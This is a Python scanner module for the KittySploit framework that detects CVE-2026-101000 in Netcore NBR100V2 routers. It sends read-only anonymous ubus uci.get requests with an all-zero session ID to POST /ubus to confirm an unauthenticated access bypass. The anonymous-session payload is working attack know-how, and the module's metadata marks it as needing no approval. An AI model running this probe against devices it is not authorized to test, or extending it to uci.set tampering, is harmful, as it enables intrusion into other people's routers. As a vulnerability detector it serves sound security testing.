#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Netcore NBR100V2 CVE-2026-101000 unauthenticated ubus uci tampering."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Netcore NBR100V2 CVE-2026-101000 Detect",
        "description": (
            "Detects CVE-2026-101000 in Netcore NBR100V2 (LEDE/OpenWrt): when the "
            "device is factory-default (initialized=0), anonymous ubus sessions may "
            "call uci.get on permitted configs via POST /ubus. Uses read-only uci.get "
            "probes — does not invoke uci.set or uci.apply."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-101000"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-101000",
            "https://github.com/senxitoyshuyi-ui/HACKALL",
        ],
        "tags": [
            "web",
            "scanner",
            "netcore",
            "router",
            "openwrt",
            "ubus",
            "auth-bypass",
            "cve-2026-101000",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "anonymous ubus uci"},
                ],
            },
        },
    }

    _ANON_SID = "00000000000000000000000000000000"

    def _ubus_call(self, method: str, params: dict) -> dict | None:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "call",
            "params": [self._ANON_SID, "uci", method, params],
        }
        response = self.http_request(
            method="POST",
            path="/ubus",
            headers={"Content-Type": "application/json"},
            data=json.dumps(payload),
            allow_redirects=False,
        )
        if not response or int(response.status_code or 0) not in (200, 204):
            return None
        try:
            return response.json()
        except Exception:
            return None

    def run(self):
        ubus_probe = self.http_request(method="GET", path="/ubus", allow_redirects=False)
        if not ubus_probe or int(ubus_probe.status_code or 0) not in (200, 400, 405):
            return False

        result = self._ubus_call("get", {"config": "system"})
        if not result:
            return False

        status = None
        data = result.get("result")
        if isinstance(data, list) and data:
            status = data[0]

        if status != 0:
            return False

        self.set_info(
            severity="critical",
            cve="CVE-2026-101000",
            reason=(
                "Netcore NBR100V2 accepts anonymous ubus uci.get (factory-default ACL); "
                "unauthenticated uci.set/apply tampering may be possible while initialized=0"
            ),
            path="/ubus",
        )
        return True
